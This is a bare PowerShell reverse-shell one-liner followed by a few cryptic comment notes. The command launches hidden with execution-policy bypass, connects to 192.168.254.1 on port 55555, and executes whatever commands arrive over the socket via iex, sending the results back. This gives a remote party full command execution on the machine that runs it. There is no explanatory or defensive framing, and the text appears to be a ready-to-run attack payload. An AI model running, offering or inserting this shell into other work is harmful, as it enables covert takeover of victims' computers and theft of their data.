﻿powershell -NoP -NonI -W Hidden -Exec Bypass -Command $sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$bypass = "ASCII";$st=([text.encoding]::$bypass).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
 
 #split p
 #p 55
 #r 44
